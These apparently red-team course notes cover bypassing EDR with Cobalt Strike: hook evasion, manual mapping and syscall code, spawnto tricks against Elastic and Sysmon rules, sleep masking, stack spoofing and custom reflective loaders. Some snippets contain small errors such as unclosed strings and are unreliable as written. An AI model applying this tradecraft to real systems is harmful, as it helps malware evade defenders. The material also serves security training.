An EDR will primarily:

- Collect event data from managed endpoints.
- Analyse the data to identify known threat patterns.
- Where applicable, automatically respond to threats (such as blocking/containing) and raise alerts.
- Aid manual investigations by providing forensic and analysis capabilities

The protected endpoints will typically have the EDR's "agent" installed on them.  This is responsible for collecting and shipping log data to a central repository, responding to detected threats, and provides those forensic capabilities

## Detecting the bad

EDRs can use multiple telemetry sources to gather information on what a process is doing from userland API hooks, drivers and ETW. Suspicious activity based on this telemetry may be blocked and/or alerted on. To set the scene, launch a benign process such as Notepad on the attacker desktop. Launch WinDbg and go to File > attach to process. Select this instance of notepad from the process list and click attach. In the command window, type `u ntdll!NtOpenProcess` and press enter. This will show the CPU instructions for calling the NtOpenProcess API loaded from ntdll.dll. Not the first two instructions: `mov r10, rcx; mov eax 26h`

To simulate EDR behavior we're going to use [injdrv](https://github.com/wbenny/injdrv). 

1. make sure that the test signing is enabled on the attacker desktop `bcdedit -set testsigning on; shutdown /r /t 0
2.  "Test Mode" will be displayed on the bottom right of the desktop
3. launch a terminal window as a local admin and run `injldr.exe -i`
4. Open Notepad and notice an alert will show on the console, Process hacker will show that a new DLL `injdllx64.dll` is loaded into the process
5. Attach WinDbg to this instance of notepad.exe and we can see that the CPU instructions for NtOpenProcess have been modified, utilizing a jmp command 

Finally, [Matt Hand](https://twitter.com/matterpreter) wrote a simple C# tool called [HookDetector](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) which works by inspecting the first 4 bytes of these API instructions.  If they do not match the expected sequence of `0x4c, 0x8b, 0xd1, 0xb8` then it concludes that it has been hooked.  This can be quite useful when used with Cobalt Strike's `execute-assembly` command.
```
C:\Tools\OffensiveCSharp\HookDetector\bin\Release\HookDetector.exe
```

Now that we have some understanding about how an EDR can function, we can tackle ways to work about it.  We'll focus on techniques to combat the userland DLL, hooking and the kernel callbacks.

## Hook Bypass Strategy 

Inline hooks can be effectively "unhooked" by patching back over them to restore their original values. Since this is all happening in userland of a process that we control, we're technically free to do that.  We could even reload modules from disk (e.g. kernel32.dll, ntdll.dll etc) and map an entirely fresh copy into memory, erasing the hooks.  However, one downside is if an EDR monitors the integrity of its own hooks, it can simply re-hook them and raise an alert that hook tampering was detected.

In my view, a better strategy is to find different ways of executing the desired APIs, without ever touching the hooks

## Process Mitigation Policy

If a module is not signed by Microsoft, we can prevent it from being loaded into a process altogether if it's spawned with an appropriate `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY`.  This is really easy to do as it's defined in a `PPROC_THREAD_ATTRIBUTE_LIST` - exactly the same as we did with PPID Spoofing.

```
//define the policy
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

//update the list
UpdateProcThreadAttributes(si->lpAttributeList,
NULL,
PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
&policy,
sizeof(DWORD64),
NULL,
NULL);
```

Once the process is running, check the mitigation policies in Process Hacker and it will say "Signatures restricted (Microsoft Only)". Our injdrv project will be unable to inject injdll into it. 

This policy does not prevent shellcode being injected into it, so can be leveraged easily enough within initial access payloads such as those made with GadgetToJScript. This can provide protection for the beacon payload itself, beacon also has a setting called `blockdlls` which instructs it to use this mitigation policy during fork and run commands when spawning the temporary process. This can extend the same protection to various post-ex activities. 

```
help blockdlls
```

This feature only works against non-signed binaries and is only available windows 10 and up

## D/Invoke Manual Mapping

Manual mapping is a technique for loading a DLL into your process and resolving the location of all of its exports without using the windows loader. In the context of userland hooks, it allows us to load a fresh copy of ndll.dll from disk into a new region of memory and executing APIs from there instead. This method of loading would also not trigger PsSetLoadImageNotifyRoutine. Having this capability available in C# also makes some tradecraft such as initial injection via GadgetToJScript more interesting. 

To make correlation easier, print the PIDs of both the current process and target process:

```
//print our own pid
var self = Process.GetCurrentProcess();
Console.WriteLine("This PID: {0}, self.Id);

//find an instance of notepad
var notepad = Process.GetProcessesByName("notepad").FirstOrDefault();

if (notepad is null)
{
Console.WriteLine("No notepad process found");
return;
}

//print target pid
Console.WriteLine("Target PID: {0}, notepad.Id);
```

Mapping ntdll.dll is as simple as calling `MapModuleToMemory` with the path to the DLL

```
//map ntdll
var map = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
Console.WriteLine("NTDLL mapped to 0x{0:X}", map.ModuleBase.ToInt64());
```

If we print the base address of the map, we can look it up in Process Hacker. The original instance of NTDLL starts at 0x7ff85ed50000

Whereas the manual mapped instance starts at 0x29ca9a30000

After preparing the parameters for NtOpenProcess, it can be called using CallMappedDLLModuleExport

```
//prepare parameters
var oa = new Data.Native.OBJECT_ATTRIBUTES();
var target = new CLIENT_ID
{
UniqueProcess = (IntPtr)notepad.Id
};

object[] parameters = 
{
IntPtr.Zero, (uint)0x1F0FFF, oa, target
};

//call NtOpenProcess from it
var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
map.PEINFO,
map.ModuleBase,
"NtOpenProcess",
typeof(NtOpenProcess),
parameters,
false);

Console.WriteLine("Status: {0}, status);
Console.WriteLine("hProcess: 0x{0:X}, ((IntPtr)parameters[0]).ToInt64())
```

A manually mapped DLL can be freed from memory when no longer required with `Map.FreeModule`. If you observe the output of the injldr console, you should not see any log of your PID calling NtOpenProcess to notepad.

Complete code:

```
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

using Data = DInvoke.Data;
using DInvoke.ManualMap;
using DInvoke.DynamicInvoke;

namespace ManualMapper
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtOpenProcess(
            ref IntPtr ProcessHandle,
            uint AccessMask,
            ref Data.Native.OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        static void Main(string[] args)
        {
            // print our own pid
            var self = Process.GetCurrentProcess();
            Console.WriteLine("This PID: {0}", self.Id);

            // find an instance of notepad
            var notepad = Process.GetProcessesByName("notepad").FirstOrDefault();

            if (notepad is null)
            {
                Console.WriteLine("No notepad process found");
                return;
            }

            // print target pid
            Console.WriteLine("Target PID: {0}", notepad.Id);

            // map ntdll
            var map = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");
            Console.WriteLine("NTDLL mapped to 0x{0:X}", map.ModuleBase.ToInt64());

            // prepare paramters
            var oa = new Data.Native.OBJECT_ATTRIBUTES();
            var target = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)notepad.Id
            };

            object[] parameters =
            {
                IntPtr.Zero, (uint)0x1F0FFF, oa, target
            };

            // call NtOpenProcess from it
            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                map.PEINFO,
                map.ModuleBase,
                "NtOpenProcess",
                typeof(NtOpenProcess),
                parameters,
                false);

            Console.WriteLine("Status: {0}", status);
            Console.WriteLine("hProcess: 0x{0:X}", ((IntPtr)parameters[0]).ToInt64());

            Map.FreeModule(map);
        }
    }
}
```

Downside to this is that it needs to call some APIs such as NtAllocateVirtualMemory, NtWriteVirtualMemory and NtProtectVirtualMemory, which may be hooked. However, since windows loader does also do this, it may not be a problem depending on how aggressive a security solution is. 

## Syscalls

x86 CPUs have four privilege levels, known as "rings". They range from Ring 0 to Ring 3. 3 being the least privileged. They control access to resources such as memory and CPU operations.

Windows only supports rings 0 and 3, referred to kernel mode and user mode respectively. The majority of user activity will occur in ring 3 but applications do also transition into ring 0 when needed. The Win32 APIs such as kernel32.dll and user32.dll are designed to be the first port of call for developers. These APIs will then call lower-level APIs such as ntdll.dll. Microsoft purposely does not document most of the NTDLLs APIs and can make changes to them at any time. They may change how other user mode DLLs interact with NTDLL as long as the original user mode DLL interfaces do not change. 

An application may call [CreateFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) in kernel32.dll to open a file from disk.  CreateFileW will then call [NtCreateFile](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile) in ntdll.dll, and ntdll.dll in turn uses a system call (or "syscall") to transition into the kernel (ntoskrnl.exe) to access the filesystem hardware.  From a call stack perspective, that would be something like `UserApp.exe -> kernel32.dll -> ntdll.dll -> ntoskrnl.exe`.

We already saw the syscall stub for NtOpenProcess in WinDbg. The important instructions from it are:

```
mov r10, rcx
mov eax, 26h
syscall
ret
```

Every syscall has a unique number, called a System Service Number (SSN) which can vary across different editions and versions of windows. On windows 10, the ssn for NtOpenProcess is 0x0026. This is why the CPU instructions for NtOpenProcess move this value into the EAX register prior to the syscall instruction. 

Resources such as [j00ru's System Call Table](https://j00ru.vexillium.org/syscalls/nt/64/) have each SSN documented.

## Direct vs Indirect Syscalls

### Direct Syscalls

In the previous section we saw manual mapping being used to read a fresh instance of NTDLL into our process so that we could call and unhooked version of the NtOpenProcess API. We also saw that NtOpenProcess and other Nt* APIs only need to execute 4 instructions to work. We can also just executing the syscall stub instructions directly, without actually calling the API. 

Steps:
1. To do this in C enable MASM in Visual Studio. 
2. Create a new C++ Console App project then go to *Project > Build Customizations* and tick masm
3. Create a new file in the project called `syscalls.asm` and add the following code:
```
.code
 NtOpenProcess proc
  mov r10, rcx
  mov eax, 26h
  syscall
  ret
 NtOpenProcess endp
end
```
4. Then create a header file that will contain the function definition and the various structs that are required
```
#pragma once

#include <Windows.h>

typedef ULONG ACCESS_MASK;

typedef struct _UNICODE_STRING {
USHORT Length;
USHORT MaximumLength;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECTATTRIBUTES {
ULONG Length;
HANDLE RootDirectory;
PUNICODE_STRING ObjectName;
ULONG Attributes;
PVOID SecurityDescriptor;
PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
HANDLE UniqueProcess;
HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

EXTERN_C NTSTATUS NtOpenProcess(
 _Out_ PHANDLE ProcessHandle,
 _In_ ACCESS_MASK DesiredAccess,
 _In_ POBJECT_ATTRIBUTES ObjectAttributes,
 _In_opt_ PCLIENT_ID ClientId);
```

The EXTERN_C macro allows the linker to link this function definition with the assembly code above, as long as the functions both have the same name. It can then be called like any other function in your main code. 

```
#include <iostream>
#include <syscalls.h>

int main(int argc, const char* argv[])
{
NTSTATUS status;
HANDLE hProcess;
OBJECT_ATTRIBUTES oa = { 0 };
CLIENT_ID cid = { 0 };

cid.UniqueProcess = (HANDLE)atoi(argv[1]);

status = NtOpenProcess(
&hProcess,
0x1F0FFF,
&oa,
&cid);

printf("Status : %d\n", status);
printf("hProcess: 0x%11p\n", hProcess);
}
```

Two downsides, AV is now detecting on this part of the syscall sub itself because a user application would not normally execute a syscall instruction. The second is with the call stack, in the previous section we showed that it would normally look like: ``UserApp.exe -> kernel32.dll -> ntdll.dll -> ntoskrnl.exe``  However, code execution does not flow through the userland DLLs when a direct syscall is made, but directly to the kernal.

### Indirect Syscalls

Indirect Syscalls addresses both the problems with Direct Syscalls by replacing the direct syscall instruction with a jmp. The memory address being jumped to is usually a location inside ntdll.dll that contains a syscall instruction. The memory address itself is found dynamically during runtime. One strategy is to walk the PEB until the Nt* API is found, and reading static offsets from it. 

This is how dynamic SSN resolution can be carried out as well. Example:

We could walk the exports until we found NtOpenProcess and its export address of 0x7ff85eded510. We know that the first 3 bytes will be the mov r10, rcx instruction and the next byte, 0xb8, is part of the next mov instruction. Therefore, the SSN is always at the next position, which is +4 from the export address because ofzero-indexing.

In a similar fashion, the address of the syscall instruction is always at +12

This can be verified with WinDbg when attached to a none-hooked process

```
db ntdll!NtOpenProcess + 4 L1
db ntdll!NtOpenProcess + 12 L1
```

Hooked processes can complicate matters because they overwrite different parts of memory, which make static offsets quite unreliable.  [modexp](https://twitter.com/modexpblog) documented several approaches [here](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/) but going into them is not within the scope of this course.

Integrating indirect syscalls into your own code is made easy with tools such as [SysWhispers3](https://github.com/klezVirus/SysWhispers3) by [KlezVirus](https://twitter.com/KlezVirus).  It will generate the appropriate .asm, .h and .c files that you can import into Visual Studio and utilise in practically the same way as above.

The only way to leverage syscalls in past versions of Cobalt Strike was via tools such as SysWhispers.  However, since 4.8, syscall options are built-in, which we will look at next.

## Syscalls in Cobalt Strike

First place where syscalls can be used is in the initial payloads generated in Cobalt Strike. Syscalls can be enabled via the artifact kit by specifying embedded, indirect, or indirect_randomized

The embedded method is the same as direct and uses the syscall/syscenter instruction for x64/x86 respectively.

The indirect method moves the memory address of the syscall instruction into a CPU register and then jumps to it. r11 is used for x64 and edi for x86. The memory address it grabs is from the same Nt function that correlates to SSN.

The indirect_randomized method is a variation of the above but will jump to the syscall address of a completely different Nt function. You can see the subtle difference where the indirect method calls `SW3_GetSyscallAddress` but indirect_randomized calls `SW3_GetRandomSyscallAddress`.

The reason behind this is that some security solutions inspect the return address of a system call to determine which Nt function was used. The better detection would be to look at the actual SSN value rather than the return address, and having a return address to an Nt function that does not correspond to the SSN being called may actually be more anomalous. 

The use of syscalls can also be enabled in the Sleepmask kit for when it needs to mask beacons .text section. Instead of using VirtualProtect to flip the memory permissions between RX and RW, it will use the syscall method supplied to its build script. 

Finally there is a system call setting to choose from when generating your payloads from the CS client, which changes the APIs used internally within beacon. Syscalls are exposed in these three ways because they are independent of each other and affect different parts of the code. At the time of writing, Beacon can use syscalls in place of the following APIs:

- CloseHandle
- CreateFileMapping
- CreateRemoteThread
- CreateThread
- DuplicateHandle
- GetThreadContext
- MapViewOfFile
- OpenProcess
- OpenThread
- ReadProcessMemory
- ResumeThread
- SetThreadContext
- UnmapViewOfFile
- VirtualAlloc
- VirtualAllocEx
- VirtualFree
- VirtualProtect
- VirtualProtectEx
- VirtualQuery
- WriteProcessMemory
## Network Connections

EDRs can log when processes make network connections, which can help spot anomalous activity such as C2 beaconing. In a target environment, defenders would likely also see the outbound connection going to their boundary firewall or web proxy.  A new event will be generated for every check-in made by the Beacon, so if you're on `sleep 0`, get ready to be flooded.

As the operator, you should consider whether or not it makes sense for your host process to be making network connections.  An HTTP/S Beacon will make HTTP/S connections, the TCP Beacon TCP connections and the SMB Beacon named pipe connections.

For instance, you may consider a web browser process to be more appropriate for HTTP/S connections.

EDRs may also look for specific types of network traffic, such as Kerberos and LDAP, from processes that would not normally produce it.  This makes tools such as Rubeus and ADSearch much harder to execute.

One solution is to use a spawnto that is contextual for that type of traffic.  If available, `ServerManager.exe` and `dsac.exe` are good candidates for LDAP, as is `gpresult.exe`.

```
spawnto x64 %windir%\sysnative\gpresult.exe
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --computers
```

The only native process on a Windows domain-joined machine that normally produces Kerberos traffic is `lsass.exe` which, although possible, you probably don't want to use as a spawnto.

There are a handful of non-default processes, such as `AzureADConnect.exe`, that do, but you are simply out of luck if they are not installed.

There is another type of alert (that may or may not be specific to Elastic), called "Network Connection via Process with Unusual Arguments". This rule works by looking at network connections from processes that typically have more than one command line argument, but started with just one.  For example, if you have your spawnto set to `dllhost.exe`, then the process creation events for fork & run post-ex commands would look something like:

```
Image: C:\Windows\System32\dllhost.exe
CommandLine: C:\Windows\system32\dllhost.exe
```

However, if we look at instances of dllhost running on our machine, we see that they're running with a `/Processid` parameter.

The rule is essentially concluding that the binary is performing some function even though it was not started in the typical way, which it considers suspicious.  Unfortunately, the `argue` command does not apply to post-ex jobs, so we cannot use that here.

However, we can, under some circumstances, abuse the spawnto setting instead by providing arbitrary arguments to it, such as:
```
spawnto x64 %windir%\sysnative\dllhost.exe /Processid:{11111111-2222-3333-4444-555555555555}
```

Another fun fact is that this pattern also allows it to bypass process creation events in SwiftOnSecurity's [Sysmon configuration](https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml#L87).

## Image Load Events

An "image load" event occurs when a process loads a DLL into memory.  This is a perfectly legitimate occurrence and all processes will have a plethora DLLs loaded.

Ingesting all image load events into a SIEM is not completely viable due to the huge volume, but defenders can selectively forward specific image loads based on known attacker TTPs.  One example of this is `System.Management.Automation.dll`, which contains the runtime for hosting PowerShell.  Both `powershell.exe` and other "unmanaged" PowerShell tools require this DLL to function.  Therefore, any anomalous process loading this DLL could be seen as suspicious.

Attempting to run PowerView with `powerpick` may produce this alert.

This is because our current spawnto binary is not one that is known to legitimately load this DLL.  To circumvent the alert, we can simply modify the spawnto to one that is known to load it, such as `msiexec.exe`.

```
spawnto x64 %windir%\sysnative\msiexec.exe
powerpick Get-Domain
```

## Thread Stack Spoofing

Thread Stack (or Call Stack) Spoofing, is another in-memory evasion technique which aims to hide abnormal or suspicious call stacks.  But first - what is a call stack?  In general terms, a "stack" is a LIFO (last in, first out) collection, where data can be "pushed" (added) or "popped" (removed).

The purpose of a thread call stack is to keep track of where a routine should return to once it's finished executing.  For example, the MessageBoxW API in kernel32.dll has no knowledge of anything that may call it.  Before calling this API, a return address is pushed onto the stack, so that once MessageBoxW has finished, execution flow can return back to the caller.

Let's see what this means in the context of Beacon.  In this example, thread 2348 is the one running Beacon.  If we look at its thread stack, we can see a call to [SleepEx](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex) with an eventual return address of `0x1ace70`.

Cross-referencing the memory address, we find that it leads straight to the Beacon .text section.

There is also an exceptionally cool tool called [Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons) that you can run from a command prompt.  It will search for sleeping threads and then walks the call stack to find abnormalities.

Cobalt Strike's default implementation of stack spoofing can be found in the Artifact Kit under `src-common/spoof.c` and a detailed explanation of how it works in `README_STACK_SPOOF.md`.  It essentially leverages [Fibres](https://docs.microsoft.com/en-us/windows/win32/procthread/fibers) to switch the context of the thread stack during Beacon's sleep phase to obscure the actual return address.  It can be enabled by setting the "stack spoof" option in the build script to `true`.

```
./build.sh "pipe" MapViewOfFile 296948 0 true true none /mnt/c/Tools/cobaltstrike/artifacts
```

After generating and executing a new payload, you will see that the call stack now returns to RtlUserFibreStart instead. Now Hunt-Sleeping-Beacons also does not identify the thread.


## Sleep Mask Kit

If you execute a Beacon on Workstation 1 and let it run without issuing any commands, Elastic Security will pop an alert that it detected it in memory.

As we know from previous modules, the Beacon reflective DLL will be running in an RX (or even RWX) region of process memory.  It will check into the team server for new jobs after every sleep cycle, execute them (if any) and then goes back to sleep.  The Sleep Mask Kit provides a means for Beacon to obfuscate its own memory regions before entering the sleep cycle, and then deobfuscate itself when it wakes up.  The default mask achieves this by walking its own memory and XOR'ing each byte with a random key. 

This means that if a memory scanner looks at Beacon memory whilst it's asleep, it will only see obfuscated memory and therefore won't trigger on these static IOCs.  It's important to understand that the Sleep Mask becomes less effective the shorter Beacon's sleep time is, because it will spend more time in a deobfuscated state.

The default Sleep Mask code can be found in `C:\Tools\cobaltstrike\arsenal-kit\kits\sleepmask`.  The kit was changed significantly in CS 4.7, so there are two source directories - `src` for 4.4 - 4.6 and `src47` for 4.7 and up.  The nicest way (in my opinion) to review the code is to launch Visual Studio Code, go to _File > Open Folder_ and select the src47 directory.

The kit can appear quite complex because of the various build options, but it's really not that bad.  Here's an example.

```
./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
```

Add `set sleep_mask "true";` to the `stage` block of your C2 profile, load `sleepmask.cna` via the CS Script Manager and then regenerate your payloads.

### Newer sleep mask
This use of the Sleep Mask Kit is not compatible with the stack spoofing shown in the previous section.  The reason for this is that the stack spoofing code places a hook on Beacon's sleep function with a small trampoline that redirects execution flow in order to perform the spoofing.  This sleep mask code essentially overwrites this because it also needs to hook the sleep function to perform the memory masking.

To work around this, the Sleep Mask Kit has an additional option called "evasive sleep", of which there are two flavors - "evasive sleep" and "evasive sleep stack spoof".  Both are only supported on 64-bit.  The stack spoofing available here is also far more flexible than the version included inside the Artifact Kit, as it allows you to arbitrarily form your own stack from scratch.  However, that flexibility comes with some overhead.

Since various versions of Windows DLLs may have different offsets, your sleep mask code will have to target a specific version of Windows to look valid.  This involves running a test VM of the same version as your target, investigating, and effectively cloning the thread stack of a legitimate process.

Steps:
1. Enable evasive sleep inside the sleep mask kit source code, open `sleepmask.c` and go to the line with `#define EVASIVE_SLEEP` line, change the value from 0 to 1.
2. Scroll down to the `#if EVASIVE_SLEEP` line, comment out the line for including `evasive_sleep.c` and uncomment the line for including `evasive_sleep_stack_spoof.c`
3. Now open and edit the `evasive_sleep_stack_spoof.c` file and look for the `set_callback` function, around line 105 which has commented code on what to do next
4. Use process hacker on a windows target system to find a stack you want to spoof, in our case we want to look for those that start with `NtWaitForSingleObject`, such as msedge.exe, smartscreen.exe and conhost.exe
5. use the module, function and offset information as input to the getFunctionOffset utility outputes information including the code to use in this function. Once we have an idea about what our stack needs to look like, we can generate the `set_frame_info` code that we need.  The included getFunctionOffset utility (located in `C:\Tools\cobaltstrike\arsenal-kit\utils\getFunctionOffset`) will help with this.
```
//replicating the conhost stack:
> getFunctionOffset.exe KernelBase DeviceIoControl 0x86
> getFunctionOffset.exe kernel32 DeviceIoControl 0x81
> getFunctionOffset.exe kernel32 BaseThreadInitThunk 0x14
> getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
```
6. The getFunctionOffset utility outputs information including the code to use in this function. Copy the generated code into set_callstack (replacing the example lines that were already there).
```
set_frame_info(&callstack[i++], L"KernelBase", 0, 0x35936, 0, FALSE);  // DeviceIoControl+0x86
set_frame_info(&callstack[i++], L"kernel32", 0, 0x15921, 0, FALSE);    // DeviceIoControl+0x81
set_frame_info(&callstack[i++], L"kernel32", 0, 0x17344, 0, FALSE);    // BaseThreadInitThunk+0x14
set_frame_info(&callstack[i++], L"ntdll", 0, 0x526b1, 0, FALSE);       // RtlUserThreadStart+0x21
```

Once the kit and payloads have been rebuilt, you can verify that everything looks as expected.

### CFG consideration

The final point of consideration is when injecting Beacon shellcode that has evasive sleep enabled into processes that are protected with Control Flow Guard (CFG).  CFG is a binary exploitation protection (like DEP and ASLR) which aims to mitigate memory corruption exploits.  If we launch a process, such as Notepad, and look at its properties in Process Hacker, we can see that CF Guard is enabled.

If we injected Beacon shellcode into this process now, it would just crash.  To get around this, the Sleep Mask Kit has an included CFG bypass capability, which we can enable by flipping `CFG_BYPASS` from 0 to 1 in `evasive_sleep_stack_spoof.c`.

No modification of `cfg.c` is necessary although I encourage you to read it.

## Mutator Kit

The Mutator Kit is the latest addition to the Cobalt Strike Arsenal, which is an LLVM obfuscator designed to break in-memory YARA scanning of the sleep mask.  If you're unfamiliar with what LLVM is, this "[LLVM in 100 Seconds](https://www.youtube.com/watch?v=BT2Cv-Tjq7Q)" video by Fireship provides a good overview. This allows you to invent your own programming language and have LLVM compile it for you.  The LLVM project even has a [tutorial series](https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/index.html) on how to do that from scratch.

The Mutator Kit works by taking the source code of the sleep mask kit and parsing it into LLVM IR.  It then runs the IR through a number of obfuscation techniques before producing the final build.  This is a clever way of providing obfuscation without having to directly modify the original source code and each build of the sleep mask kit will be unique.

There are 4 types of obfuscation possible with the kit.  They are:

- _Substitution_ - replace binary operators with functionally equivalent ones.  For example, replacing `a = b + c` with `a = b - (-c)` and other variations.
- _Control Flow Flattening & Basic-Block Splitting_ - manipulates the control flow of a function by removing easily identifiable conditional and looping structures.
- _Bogus_ - inserts fake control blocks to modify the control flow of a function.  It works by adding a conditional jump that points into either the original block or a fake block looping back to the conditional jump block.  This option is disabled in the kit by default because it can increase the final size of the compiled sleep mask.

Before using the Mutator Kit, ensure that your C2 profile is setup appropriately.  The recommended configurations are as follows:

```
stage {
    set sleep_mask "true";
    set cleanup "true";
    set userwx "false";
}

process-inject {
    set startrwx "false";
    set userwx "false";
}
```

Payloads generated with this profile will have the default sleep mask applied, which will trigger the `Windows_Trojan_CobaltStrike_b54b94ac` YARA rule as it specifically targets the sleep obfuscation routine.

Instead of building the sleep mask kit and loading sleepmask.cna as in the previous lesson, load `sleepmask_mutator.cna` from `C:\Tools\cobaltstrike\arsenal-kit\kits\mutator\`.  This will add a new Sleep Mask Mutator menu item which will launch a Preferences window.  These options can be left as they are.

Generate a new set of payloads using _Payloads > Windows Stageless Generate All Payloads_.  If you launch the Script Console, you will see the aggressor script calling into WSL to run the default sleep mask through the LLVM obfuscation.

The script prints the SHA256 checksum of the mask's `.text` section, `412ee9b145471e91e772f0768a8ad827c2dbf3ff67626feedf92ce5c99b6f7ac` in this example.  If you scan the entire output, you will see that every sleep mask has a different checksum.

Many of the previous YARA signatures are no longer present.

One aspect to note about the Mutator Kit is that it is not compatible with evasive sleep or syscalls.  This is because syscalls involve inline assembly code that cannot be mutated without breaking functionality; and since the aim of this kit is to break YARA signatures targeting the sleep mask in-memory, the evasive sleep mask is no longer necessary.

## Testing with YARA

It's not particularly convenient to prepare a Beacon or post-ex assembly, and then drop it to a target machine to see if it gets detected or not.  As with the ThreatCheck approach, it's much better to be able to test tools on your own machine first.  Elastic are very open about using YARA rules to aid in their detection coverage and have even [open sourced](https://github.com/elastic/protections-artifacts/tree/main/yara) their ruleset.  We can use these to test our tools and payloads before using them on a target  machine.  However, it's important to understand that these are just part of their overall solution, and just because we can evade their public YARA rules does not mean we will go undetected.  Other AV and EDR vendors are likely also using these as a source of detection, but like Elastic, will sprinkle their own secret sauce in as well.

The YARA executable can be found in `C:\Tools\protections-artifacts` and is especially useful at scanning either a file on disk or a running process against one or more `.yar` files.  The syntax is `yara [OPTIONS] RULES_FILE TARGET`.

For example, to scan a Beacon payload on disk:

```
yara64.exe -s yara\rules\Windows_Trojan_CobaltStrike.yar C:\Payloads\http_x64.exe
```

To scan a running process:
```
yara64.exe -s yara\rules\Windows_Trojan_CobaltStrike.yar 2296
```

Scanning processes in memory is an efficient way of quickly testing evasive configurations, such as the sleep mask.

## User-Defined Reflective Loader

As has already been mentioned, both the Beacon DLL payload and fork & run post-ex DLLs are loaded into memory using a reflective loader.  As expected, this component is a target for AV and EDR vendors to signature.  If we scan default Beacon shellcode with YARA we'll likely see the "Windows_Trojan_CobaltStrike_f0b627fc" rule get hit, as this specifically targets the default reflective loader.

A lot of the behaviours surrounding the reflective loading process can be modified using Malleable C2, but you can go a step further and use your own completely custom loader.  This affords you the ultimate level of flexibility and is made possible with the User-Defined Reflective Loader (UDRL) kit.  However, do note that using your own loader will cause some incompatibilities with Malleable C2 settings such as obfuscate, userwx, and sleep_mask.

The Cobalt Strike team have provided several examples in a Visual Studio solution, which can be found at `C:\Tools\cobaltstrike\arsenal-kit\kits\udrl-vs\udrl-vs.sln`.  They are so called:

- default-loader
    - The default loader based on Stephen Fewer's original.
- obfuscation-loader
    - A "Double Pulsar" style loader that leverages encryption and compression.
- bud-loader
    - This provides an example of using Beacon User Data (BUD).  This is a C-structure that can be used by a reflective loader to pass additional data to Beacon.
- postex-loader
    - The default fork and run reflective loader.  Based functionally on the default-loader.

The best way to carry out UDRL development and testing is with the included `example.profile` Malleable C2 file.  This has already been copied to the team server, so you can start it with

```
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/udrl.profile
```

It's also a good idea to completely unload all of your aggressor scripts from the CS client that influence payload generation.  Then create a new HTTP listener that will beacon directly back to 10.10.5.50, and generate some new shellcode without guardrails or syscalls, etc.

The next step is to pack that shellcode into the UDRL source code using the provided `udrl.py` script.  This will give the loader something to work with inside Visual Studio

```
py.exe .\udrl.py xxd C:\Payloads\http_x64.xprocess.bin .\library\DebugDLL.x64.h
```

You can then set the default-loader project as the startup project and run it using the local debugger.  This allows you to set breakpoints and inspect variables, etc.  The console window will display the output produced by the `PRINT` statements.  Eventually, the Beacon will begin checking in.

You are free to make any modifications that you wish to the loader's source code.  One suggestion is to change the initial memory allocation from RWX to RW, and then set the memory permission for each section according to its characteristics.

To integrate your customized loader into Cobalt Strike, switch the build configuration to Release and build the project.  

Visual Studio will build the loader and automatically runs udrl.py to extract the .text section from the .exe.  You will also see two CNA files in the associated bin directory (`C:\Tools\cobaltstrike\arsenal-kit\kits\udrl-vs\bin\default-loader` in this case) called `prepend-udrl` and `stomp-udrl`.  You can choose which variant to use based on how you want the reflective loader to be combined with the Beacon DLL.  The "prepend" variant  prepends the loader to the start of the DLL, which was made popular by the NSA's Double Pulsar exploit. The "stomp" variant patches the loader into the Beacon DLL which followers the Steven Fewer technique. These example loaders do not compile to a significantly large size (they are ~2-3KB).  However, if your changes push the size > 100KB, you will have to account for that in your artifacts to ensure there is enough space allocated to accommodate it.

You can then restart the team server with your regular C2 profile and regenerate the payloads.  In my case, the f0b627fc rule is no longer triggered.

## Kernel Callbacks

Windows drivers are able to register callback routines in the kernel, which are triggered when particular events occur.  These can include process and thread creation, image loads and registry operations.  For example, when a user attempts to launches an exe, a notification is sent to any driver that has registered a callback with [PsSetCreateProcessNotifyRoutineEx](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutineex).  The driver then has an opportunity to take some action, such as blocking the process from starting or injecting a userland DLL into it.

These callbacks are stored within kernel memory and each routine has its own "array", such as the PspCreateProcessNotifyRoutine array.  Each entry in the array contains a pointer to a function within the driver that has registered the callback.  When an event in question occurs, the kernel iterates over each entry in the array and executes the callback function within each driver.  This is all done before control of the process is returned to the user, which makes them very difficult to influence or interrupt from userland.

Applications such as Sysmon (as well as other AV and EDR solutions) have a driver component which provides much of their telemetry.  Because these callbacks are stored inside kernel memory, there is scope to remove or modify them with a custom driver.

